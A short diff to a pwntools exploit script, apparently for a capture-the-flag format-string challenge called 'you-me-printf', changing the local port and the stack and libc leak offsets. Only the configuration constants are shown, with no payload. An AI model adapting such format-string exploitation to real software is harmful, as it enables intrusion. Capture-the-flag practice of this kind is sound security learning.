@@ -5,7 +5,7 @@ from pwn import *
 exe = ELF("./you-me-printf")
 libc = exe.libc
 
-HOST, PORT = "localhost", 1337
+HOST, PORT = "localhost", 1402
 
 context.binary = exe
 context.terminal = ["tmux", "splitw", "-h", "-p", "75"]
@@ -18,9 +18,9 @@ CHECKING = True
 
 MAXSIZE = 512
 LIBC_LEAK_OFFSET = libc.sym.read + 18
-PRINTF_RETADDR_OFFSET = 0x330
+PRINTF_RETADDR_OFFSET = 0x340
 LIBC_LEAK_PRINTF_OFFSET = 3
-STACK_LEAK_PRINTF_OFFSET = 75
+STACK_LEAK_PRINTF_OFFSET = 77
 PRINTF_CONTROL_OFFSET = 6
 
 def main():
